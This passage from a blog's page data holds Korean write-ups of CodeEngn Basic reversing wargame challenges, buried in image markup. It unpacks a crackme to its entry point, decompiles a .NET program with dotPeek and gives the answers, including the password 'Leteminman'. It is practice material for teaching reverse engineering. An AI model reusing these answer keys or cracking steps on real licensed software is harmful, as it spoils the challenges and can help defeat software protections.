url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABc0lEQVR42nWPW2+bQBCFz8LCgs3FOPUuLDZrLomDZaLaGEMSJXLf2jSpenmq2v8Q9f+/VMSWpUTtaDQjnTOjbwZ/np+b3a8sf3KcG8Zu1+vPI78zzc6yXqVpdpw/uO4tY+1JRL2poyhNkphSDdCrqrGYgX+F73PDoK+kZttIWchIUmoAxsXlmjEGEEB7k74fmWZvEaIfxbu7+zgu5kpRqgP6+qq1LfM/ZHEiE0IO5J2UeTyNbdsCNHW1szy7N7QX/HG0r0EQDYYDqusWs45G13aCq3mW7ff3uUrx9ffoQ07HgCAYAyEgQF54U67aNN2E4UzwCec9rK63gqusKJbLcmi7pKwnF4F+PK2PQwcQx0VZlufF+WKxqOvtyPOwPSxneb15fxa8Q9lMqiBMYPjk9O3hbCnzqlrNZtPVahVFURCMcH19E4r5LFHff3x7/Pgw/PJz8qlK9rbTDhzluokznA90TwNw5oulEKnryPGYh6HvuX8BxT0pLPSBHKMAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/5958421308774deb33069d41c69e2658/c9b55/4.webp 165w,\n/static/5958421308774deb33069d41c69e2658/f2908/4.webp 330w,\n/static/5958421308774deb33069d41c69e2658/ff4b8/4.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/5958421308774deb33069d41c69e2658/04c57/4.png 165w,\n/static/5958421308774deb33069d41c69e2658/d9ecf/4.png 330w,\n/static/5958421308774deb33069d41c69e2658/32056/4.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/5958421308774deb33069d41c69e2658/32056/4.png\"\n            alt=\"dbg\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>패킹을 풀자 이전의 9번 같은 문제가 되었다. OEP를 찾았음을 알 수 있으며(00401000) 실행시키면 다음과 같이 오류가 뜬다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 237px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 62.42424242424243%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAIAAADtbgqsAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABtUlEQVR42qWOy2/TQBCH9/9C3OAEhyKhHpACQrQ8JSqVQwWX/kecoAol5iHyVEhC4hDnaYe1vbGd9e56/Uri2IvSCOgBpEh8+g6/0cxoBuw9f3Rw+vLg9OTG0/s3nz3Y0buvXtw6egyuHebunBzvHz+5krt99d7+ju4dPbx+mANvPknn5S/54udCpShVS4VK8bdStfRXt63X7/PA830hRJZlYme2w2juAExd7vvxYjGzrOVqRSjBLmYeC8IoEyKMouUqWafpZZP1Wghh2BYgLnZdkiSJNtUWiyUhrmEYjmNj7AohOOerJPnn5f96m3EuhEjTNNuSZn/yJdJfbPNm2bGBgZDv+5RSQgjGmHke55wQ4l7AGPMuiMIoiqI4jjn3GGNhEI40FeimGQSBruuDwQAhVC2XpA8fe4pimma73R6Px0EQUEqV3ne5K9cbDUwopRSZ5mbZmKE4jiGEXVmGENYq5bO3Z/X6V13Xa7WaoiiUUtu2O99aklTIvztHM8u2LR3qKvwBhurEmc+nEDZbrUaz0ZHlTlfe5E3Z1KbT4XjUH/YnmjbR1ImmDkbDXl8xTFPuKz8BJsdOvznS55cAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/739dfecf879f27d92d1787a377d6a87d/c9b55/5.webp 165w,\n/static/739dfecf879f27d92d1787a377d6a87d/4527a/5.webp 237w\"\n              sizes=\"(max-width: 237px) 100vw, 237px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/739dfecf879f27d92d1787a377d6a87d/04c57/5.png 165w,\n/static/739dfecf879f27d92d1787a377d6a87d/008e2/5.png 237w\"\n            sizes=\"(max-width: 237px) 100vw, 237px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/739dfecf879f27d92d1787a377d6a87d/008e2/5.png\"\n            alt=\"error\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>이제 언패킹시키기 이전의 정상적인 아래의 창처럼 뜨도록 메모리에 있는 텍스트 정보를 참고하여 어셈블리어를 만들어 보도록 한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 230px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 61.21212121212122%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAIAAADtbgqsAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABvklEQVR42qWO/WvTQBjH87cp7Bd/FgTXoW52bgOZdY52ja6din+WyvAHcaM4X6B5uSSXy8vd5Zre5ZKUtJdKM4aoAwU/fHl43r4Pj7be7ey9Pr7d2W31D+7rz+4c7rcH3YeDo3v6wVp748bm+s2ta7TRe3pr94HWHhw9fjPcfHHYHva3h/2t497eq+ePTvSdl3qr9+Rud/9a7ZzorV5HCwnO8lzkMrsSl1LIjGdZXpRFWeZlkRfFKjbJqjObFbMyTqjGM7FcLuu6Xv4zl8s8E9qU8ziKjO9mjDGwbd/32YS5NjANKwwRRMhzPWDaEPpjw/h28TUryssTjVnw6XQKHUiThBCCMaaUhj5ygJskNIpjHBPkoyiKLNv2XShk/tP8X2+zNFVKVVU1b6iq+VW6YrFYKKUWSjWjaj5flUqpuq5Zmmp+EAgh0jSd/gHnnBCCGjAmlNAwDIMggBAyxlAY/sWMEGKMFUVx9unj6ekHH6E8zwEAwLYjgrUgCqWUnHPxK5xzKaXneZZlQQjPz8/ev333+eILQmg0GgEAcEI1AD02mRBKaZL8poSxIAiMBuA4juuYlmWa5ng8xhg7PvwBKZ9ifElSp8AAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/7321b5db97ab37cc3b11600b5911d2eb/c9b55/6.webp 165w,\n/static/7321b5db97ab37cc3b11600b5911d2eb/a0b58/6.webp 230w\"\n              sizes=\"(max-width: 230px) 100vw, 230px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/7321b5db97ab37cc3b11600b5911d2eb/04c57/6.png 165w,\n/static/7321b5db97ab37cc3b11600b5911d2eb/81c8e/6.png 230w\"\n            sizes=\"(max-width: 230px) 100vw, 230px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/7321b5db97ab37cc3b11600b5911d2eb/81c8e/6.png\"\n            alt=\"crackme\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 522px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 26.666666666666668%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAz0lEQVR42hXPiW2DMBQAUKZIpKo5wP++jMFE3X+yKm+Dt1SVaYjsRAgNwg2AtnVVVWUBAAQwVUJEVICAtq7r1lr7/YHlOM/wyryYiIjPY2T11lpVRTiLutsxhggjKUISoxAL8f32XOZ17f2ImERIzPM8RL1tm4j0SjN3932MzCTW7W2uImJznoS1XNfV++j9z1Tc4zNPUSPEjNh7IXGGV2VWivj7JUwMDVTlfnstc87eR+VHGBuAMJkHQMuvaA2V2d3N7PF4M30vVfve8/mgf53uMGplpaUPAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/ca6a43ca427e671df16d2aea332d7a26/c9b55/7.webp 165w,\n/static/ca6a43ca427e671df16d2aea332d7a26/f2908/7.webp 330w,\n/static/ca6a43ca427e671df16d2aea332d7a26/25feb/7.webp 522w\"\n              sizes=\"(max-width: 522px) 100vw, 522px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/ca6a43ca427e671df16d2aea332d7a26/04c57/7.png 165w,\n/static/ca6a43ca427e671df16d2aea332d7a26/d9ecf/7.png 330w,\n/static/ca6a43ca427e671df16d2aea332d7a26/29492/7.png 522w\"\n            sizes=\"(max-width: 522px) 100vw, 522px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/ca6a43ca427e671df16d2aea332d7a26/29492/7.png\"\n            alt=\"assem\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"assembly\"><pre class=\"language-assembly\"><code class=\"language-assembly\">\r\nPUSH 0\r\nPUSH 11.00402000\r\nPUSH 11.00402012\r\n</code></pre></div>\n<p>이를 Big endien임에 주의하여 기계어로 옮긴다.</p>\n<div class=\"gatsby-highlight\" data-language=\"assembly\"><pre class=\"language-assembly\"><code class=\"language-assembly\">\r\n6A 00\r\n68 00204000\r\n68 12204000\r\n</code></pre></div>\n<p>정답: 004010006A0068002040006812204000</p>","categories":["writeup","wargame","reversing"],"date":"July 21, 2015","description":"","id":"60ef985e-2671-5885-a2a5-ed6baf261e8d","keywords":["codeengn-basic"],"slug":"/CodeEngn-Basic-WriteUp-11/","title":"CodeEngn Basic 11","readingTime":{"text":"2 min read"}},{"banner":{"alt":null,"caption":null,"src":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","backgroundColor":"#080808","images":{"fallback":{"src":"/static/7da6b36053d8801ff837ce373cd8ef25/ae22b/0.png","srcSet":"/static/7da6b36053d8801ff837ce373cd8ef25/db7a7/0.png 71w,\n/static/7da6b36053d8801ff837ce373cd8ef25/2b65a/0.png 142w,\n/static/7da6b36053d8801ff837ce373cd8ef25/ae22b/0.png 283w","sizes":"(min-width: 283px) 283px, 100vw"},"sources":[{"srcSet":"/static/7da6b36053d8801ff837ce373cd8ef25/ed67f/0.webp 71w,\n/static/7da6b36053d8801ff837ce373cd8ef25/43197/0.webp 142w,\n/static/7da6b36053d8801ff837ce373cd8ef25/bb5c3/0.webp 283w","type":"image/webp","sizes":"(min-width: 283px) 283px, 100vw"}]},"width":660,"height":401.13074204947}}}},"body":"<p>정답은 무엇인가</p>\n<p>다음은 실행시킨 최초의 화면이다. 패스워드를 알아내는 프로그램임을 알 수 있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 283px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 41.81818181818182%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA4ElEQVR42mPIam+qmtQXVVmY2liVWFee3FCZ1lydVF+eWFee0liVXF+W1FCZ0VKbVF+eUFcWX1Oa3lyT3FCR1FCZ3VbHEJydFp6b7pkY5ZsaH5CR5J+e4J0UE5iZ5J0cE5iR5J+WEJiZEpiZ7JUU7RYX4Rob5p0U45kQ5REf5ZMUw6CoqMgvICAqIszNzSUoKCgkJMjOxiYkJMTNxS0iIiwsJCwiIiIoKMTKwsKACSSkpRgYGBjBACICZjDCAVSQCQtgYGVnh2kA0WDEANHECKFh+rEANg52BrIBG/sAaQYAigQ0UJFgVBcAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/7da6b36053d8801ff837ce373cd8ef25/c9b55/0.webp 165w,\n/static/7da6b36053d8801ff837ce373cd8ef25/30314/0.webp 283w\"\n              sizes=\"(max-width: 283px) 100vw, 283px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/7da6b36053d8801ff837ce373cd8ef25/04c57/0.png 165w,\n/static/7da6b36053d8801ff837ce373cd8ef25/bde6a/0.png 283w\"\n            sizes=\"(max-width: 283px) 100vw, 283px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/7da6b36053d8801ff837ce373cd8ef25/bde6a/0.png\"\n            alt=\"program\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 418px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.96969696969697%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACDUlEQVR42k2QW2/TMACF8zOhDHjhiUnswqVjCGkCwRO/CKlq00vWdEvX3Nckju3YjtPGqe2UvaN0TOLTefheznk4xptvv45/XL39/vX459XR5/Pn/ZNe//TFxWmv3+X5p5ODnPX6J68u3/f6py8vz599fPf6y4ejizNjPLfvfG84mYym08HYHJgj05oNJxNzNhuYpmXbpmUNJ+OxZQ3M0Wg2HY4nM3vuuKvfo6FBGWuV5pyXrKw4Z4wRQjDGjDKCC15yxkpGacU5JYQxhhGuON9UlReGRpaDNMsoZaQoojDMAFBat23b7vdd2pZQlueAMlaWJSF0/2cvpRR1HSVrI4rvPddL0gxkwLl1giBSSsn/QAgHQZCmWZ6DJEkJIUKIqqruPM9I0ixNEghRDvI4jiFETdNIKdUTRUHi+B52oCiKXNdFCG83m1XgG0mWpUmGEMJFIXfy4eFBKa11+9jUWkMIoyjuqgil/wBCCD8KDb6plFJN0+ykbJqmroWo6+22llLuDmit922rtdZKdR88OcDI8APfdb0gCFeut16vAz8IwyhNs91uJw6L9QHRNIfpx/G6KyNoJGnq3Dq+72OMAQB3y+XSWWJcbCq+sBdhGHHO6+3WXblxfF+WZSNEHIYIojhZG/bNjXV9Pbfni1sHE5IjCCDEhBSU5LBzwmhBCYAQoM4hQvZi4fr+dDH/CxdtJSmt+2GcAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/d6c971a8183c32101f2a1947aaee7bda/c9b55/1.webp 165w,\n/static/d6c971a8183c32101f2a1947aaee7bda/f2908/1.webp 330w,\n/static/d6c971a8183c32101f2a1947aaee7bda/cd572/1.webp 418w\"\n              sizes=\"(max-width: 418px) 100vw, 418px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/d6c971a8183c32101f2a1947aaee7bda/04c57/1.png 165w,\n/static/d6c971a8183c32101f2a1947aaee7bda/d9ecf/1.png 330w,\n/static/d6c971a8183c32101f2a1947aaee7bda/d7398/1.png 418w\"\n            sizes=\"(max-width: 418px) 100vw, 418px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/d6c971a8183c32101f2a1947aaee7bda/d7398/1.png\"\n            alt=\"PEiD\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>PEiD로 조사해 보니 C# 닷넷 프레임워크로 짠 프로그램임을 알 수 있다. C#은 Managed code로, 이 C# 컴파일러는 바로 기계어로 컴파일을 하는 것이 아니라 다른 중간 언어로 컴파일을 해 낸다. 특정 플러그인을 설치하지 않은 올리디버거로는 분석이 불가능하므로, 닷넷용 무료 분석툴인 dotPeek을 사용하였다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 75.15151515151516%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAIAAABr+ngCAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAClElEQVR42nWR60/TUBjG+8+qKB+MJvoPCBogaqIJbIytgymXyBeDiahMIG4s3IeT2V1xs1vb057Tnl5PT3taQ2diUHzy5P30/s7zvDncZDr/lM89yWQmUunJdObRXHoiNT+VzU1lc5PpzERq/nEmO8Pnp3l+huenE8/w+WeLhekczz1/vZ1Z/TS7vJ1ZKWVXdxfXSwurOwsrO2vvDsqnnaO6uPG59pL/mHpVnFvamisUL720NbtUfMG/55Y3tjf3a5tfqm8/HB18bVZ7jbJQ3T0/PGjXWkq/j+S+prXEYUscdAbDpjho/BQ7ogyQVayccK1Oz0C657rYsiVN112oWJJOkEEQdDXZHGJP95nnBLYXOm5g+YwwxuI4rn1vco1ut9msA0XxCJEUbJmRrmOMIcaQUhLHMYsYi1iYTBaxKIpG8Fm9wZ2dt4R6o1YTuj8G/YFqGB5EroFtqOuO6wdhEP+jP/DxmdBudwEAg6EykADGsSiaEJme5VrItLFBPS9Ktq+Bz4WuLMkmxhAZsgoxjgVBvrhoQ1FUO21KSEhpFEXXwz1R9jyXUmo7LoA6xlFD6HW7HTAcapJEHCcMQ5YoHIkxSi9vqZ4LnKyi0XvEDwA0dJ32epqmqZqmQYRGEyEEIQSqCjUIAAAqsC2zcnh6BVY0nZBQkqCiqEhVbYQcbLiGQQkZNY8SjWpX642/k8MgBsBACOkQOtgktk1dl/3v5iFAyWfGjkdlzXAcTwamZdm+RwKfBj71XRKGLEp2wsQ0vIRPvjU4BfxO9mkAVBQznxErJHbEgji+RBJfTU6KdC963DhfuluoPFg7frhevZEr316sjHwrvzfGl8f4vbF8eYwv38yVxgv799ZOE5/cf3N2J1/6BcaSFdfslQ75AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/4296cbbe14ccb1641e2a6736daf6ff22/c9b55/2.webp 165w,\n/static/4296cbbe14ccb1641e2a6736daf6ff22/f2908/2.webp 330w,\n/static/4296cbbe14ccb1641e2a6736daf6ff22/ff4b8/2.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/4296cbbe14ccb1641e2a6736daf6ff22/04c57/2.png 165w,\n/static/4296cbbe14ccb1641e2a6736daf6ff22/d9ecf/2.png 330w,\n/static/4296cbbe14ccb1641e2a6736daf6ff22/32056/2.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/4296cbbe14ccb1641e2a6736daf6ff22/32056/2.png\"\n            alt=\"dotpeek\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>소스코드 수준으로 분석해낸 것을 볼 수 있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 443px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 78.18181818181817%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAIAAACZeshMAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACFUlEQVR42oWS2ZKkIBBF/f/P6zdLRNkEZFVAywWcsKZ7orpjYuY8QQT3knkzK4SvByiE4KZpuq533qfJR+f2ZXmGsMWwxbjFuEx+i/E8juuNitALwMI5h7DFCCtt4uR128q6Zh8fsq69EFGrSYik9bEf5V1M2S0mmLQQQthZ55JzuoUatgq00fv31z+oEL5A+ySE1o/68Xj0XUcZS/MsmmZ+U5ZSrvLTpyI0I2QwwqABfd8PnFOMFcGorjFo1zmEcdzWtby4bofyaVRKRWhByPddL5UahmFU6irlOU3bHI5l2VNandufz/L1bXn7v+p71nUQwhahnjAGYUcIJZSxgVFKlTZKG0YZQmgcR2MsIaTvkdFaCFGB9ng0G2WGczuOEmNCCUEIEUI453wY+DDQF1xw7x1jjFLGObfWVlrnZclzOEM4rusf0f4t7TnM1mjnrHNG3WhvzSxFsjY5F7Ve/JSsS9ZEo7cQUko550+x9ycf1GvIELYQANAA0AOghsFKyQnx1m4xrtP0fG3YmfOfzKp1zZwbbaQxdpTjqJQclZcyGpOsXaYpeR+kmIVIIe77/q3sMBeML2tLKfl7R//vv9r3/TiulM4zn+W6Si75Ph4l55JLyeX3bG/v8+abGLYQ34NBsO26DlJK7gqt82xY5ylovU6TZywqtVgbQ/iT1i3WSukXUgittLXu0/4zla+FfF1/dPILbn6Ld9LmLaUAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/8d76ca605dc232a2d0e9a449ecb31752/c9b55/3.webp 165w,\n/static/8d76ca605dc232a2d0e9a449ecb31752/f2908/3.webp 330w,\n/static/8d76ca605dc232a2d0e9a449ecb31752/23445/3.webp 443w\"\n              sizes=\"(max-width: 443px) 100vw, 443px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/8d76ca605dc232a2d0e9a449ecb31752/04c57/3.png 165w,\n/static/8d76ca605dc232a2d0e9a449ecb31752/d9ecf/3.png 330w,\n/static/8d76ca605dc232a2d0e9a449ecb31752/a120c/3.png 443w\"\n            sizes=\"(max-width: 443px) 100vw, 443px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/8d76ca605dc232a2d0e9a449ecb31752/a120c/3.png\"\n            alt=\"source\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>str이 정답임을 알 수 있다. str를 출력하기 위해 코드를 그대로 복사해서 컴파일하였다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 26.666666666666668%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA80lEQVR42iXK2XKCMBQA0EtVlEAIuVlkEUjIAqRj0Tf//8s6057nA8fxtsa0bYuIUtz6Lu/7om1vUuZdW0h5fjyKYSA1haoCITJWZ5Rm+eXknIfj9V7j2jSNlErrrmGoVKdVz7ngXFHaSNkJcb9eyel0hj9Z9gUAWmvo+l4phYi84YiopETOlZKcc0prrdT9rhljWuuyLC+XMyHkmucAMDwGMNamPaX07X2Icdu3fVt3tzgzG2NM8CGGuNjF2uXn+UwpHccr7fuyuM/nA+M4mdl45/7HNI4+BO/DPM3ehzVGY21dM1ozRI4oqqoSKAgpp2n6BapOG6CiLg8LAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/dce98b5751aa9f298ab4085d7efb63e0/c9b55/4.webp 165w,\n/static/dce98b5751aa9f298ab4085d7efb63e0/f2908/4.webp 330w,\n/static/dce98b5751aa9f298ab4085d7efb63e0/ff4b8/4.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/dce98b5751aa9f298ab4085d7efb63e0/04c57/4.png 165w,\n/static/dce98b5751aa9f298ab4085d7efb63e0/d9ecf/4.png 330w,\n/static/dce98b5751aa9f298ab4085d7efb63e0/32056/4.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/dce98b5751aa9f298ab4085d7efb63e0/32056/4.png\"\n            alt=\"Rijindael\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>Rijindael.exe를 생성하여 실행시켰다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 255px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 15.151515151515152%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAi0lEQVR42n3KWQ6CMAAFwIdACEZWCQilC1AKLbVWvP/djBdwvgfO+yLL8ls+9IPgM2f80baMCb3ruqrjGIcNNgUxQSqYFfOEosCyoLkDmzZ0pJRQOS/O+c959l3X9WQk5JqmSQJCfpVzcIGnBmMoK0iJpgHWbVerci93HMZYe/p3meUIcAnDKArx1xc4Gg6vnPduLgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/0e09c158297a5962866c17978f8a4d70/c9b55/5.webp 165w,\n/static/0e09c158297a5962866c17978f8a4d70/765b8/5.webp 255w\"\n              sizes=\"(max-width: 255px) 100vw, 255px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/0e09c158297a5962866c17978f8a4d70/04c57/5.png 165w,\n/static/0e09c158297a5962866c17978f8a4d70/b8c8f/5.png 255w\"\n            sizes=\"(max-width: 255px) 100vw, 255px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/0e09c158297a5962866c17978f8a4d70/b8c8f/5.png\"\n            alt=\"answer\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>정답: Leteminman</p>","categories":["writeup","wargame","reversing"],"date":"July 21, 2015","description":"","id":"3e22d1cf-7988-5fa8-8928-5cb0a30b0045","keywords":["codeengn-basic"],"slug":"/CodeEngn-Basic-WriteUp-13/","title":"CodeEngn Basic 13","readingTime":{"text":"2 min read"}},{"banner":{"alt":null,"caption":null,"src":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","backgroundColor":"#e8e8e8","images":{"fallback":{"src":"/static/e273bfda7d449a7352059c881881ed6f/047e6/0.png","srcSet":"/static/e273bfda7d449a7352059c881881ed6f/ce495/0.png 64w,\n/static/e273bfda7d449a7352059c881881ed6f/17e10/0.png 129w,\n/static/e273bfda7d449a7352059c881881ed6f/047e6/0.png 257w","sizes":"(min-width: 257px) 257px, 100vw"},"sources":[{"srcSet":"/static/e273bfda7d449a7352059c881881ed6f/984bc/0.webp 64w,\n/static/e273bfda7d449a7352059c881881ed6f/4e1e8/0.webp 129w,\n/static/e273bfda7d449a7352059c881881ed6f/0a0a7/0.webp 257w","type":"image/webp","sizes":"(min-width: 257px) 257px, 100vw"}]},"width":660,"height":400.6225680933852}}}},"body":"<p>Key를 구한 후 입력하게 되면 성공메시지를 볼 수 있다\r\n이때 성공메시지 대신 Key 값이 MessageBox에 출력 되도록 하려면 파일을 HexEdit로 오픈 한 다음 0x???? ~ 0x???? 영역에 Key 값을 overwrite 하면 된다.\r\n문제 : Key값과 + 주소영역을 찾으시오\r\nEx) 7777777????????</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 257px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 41.81818181818182%; position: relative; bottom: 0; left: 0; background-image: 